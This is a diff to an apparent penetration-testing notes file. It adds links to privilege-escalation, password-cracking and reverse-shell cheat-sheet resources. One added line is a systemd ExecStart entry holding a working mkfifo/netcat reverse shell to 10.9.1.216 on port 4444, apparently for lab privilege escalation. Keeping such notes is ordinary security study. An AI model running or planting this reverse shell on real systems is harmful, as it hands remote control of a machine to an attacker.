@@ -1,5 +1,9 @@
+## File Extension ##
+[File Ext](https://gist.github.com/securifera/e7eed730cbe1ce43d0c29d7cd2d582f4)
+
 ## Linux Escalation ##
 [LinEnum](https://github.com/rebootuser/LinEnum)
+
 [Linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
 
 ## Password Cracking ##
@@ -11,6 +15,8 @@
 [PenTestMonkey: Reverse Shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 
 [PenTestMonkey: TTY](http://pentestmonkey.net/blog/post-exploitation-without-a-tty)
+
+ExecStart=/bin/sh -c " rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.1.216 4444 >/tmp/f"
 
 ## URL Encoding ##
 [W3Schools URL Encode](https://www.w3schools.com/tags/ref_urlencode.ASP)
